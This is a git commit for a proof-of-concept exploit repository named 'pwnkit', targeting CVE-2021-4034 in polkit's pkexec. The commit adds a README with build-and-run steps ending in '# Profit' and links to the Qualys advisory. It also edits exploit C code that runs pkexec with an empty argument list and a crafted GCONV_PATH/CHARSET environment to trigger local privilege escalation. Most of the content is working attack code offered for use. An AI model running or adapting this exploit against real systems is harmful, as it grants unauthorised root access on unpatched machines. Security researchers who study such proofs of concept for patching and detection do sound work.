fb7b3daee57e8cbc1be2a02973bc90f9b7791fc6
Marton Szasz <szaszm01@gmail.com>
2022-01-26 15:41:46 +0100

    clean up, add readme

---
+++ README.md
@@ -0,0 +1,14 @@
+pwnkit PoC
+---
+
+```
+make
+./pwnkit
+# Profit
+```
+
+----
+
+sources:
+- https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
+- https://hugeh0ge.github.io/2019/11/04/Getting-Arbitrary-Code-Execution-from-fopen-s-2nd-Argument/
--- pwnkit.c
+++ pwnkit.c
@@ -3,7 +3,7 @@
 
 int main() {
 	char* new_argv[] = { NULL };
-	char* new_envp[] = { "payload", "PATH=GCONV_PATH=.", "SHELL=/usr/bin/ls", "CHARSET=payload", NULL };
+	char* new_envp[] = { "payload", "PATH=GCONV_PATH=.", "SHELL=random_string_thats_not_present_in_/etc/shells", "CHARSET=payload", NULL };
 	execve("/usr/bin/pkexec", new_argv, new_envp);
 	return 0;
 }
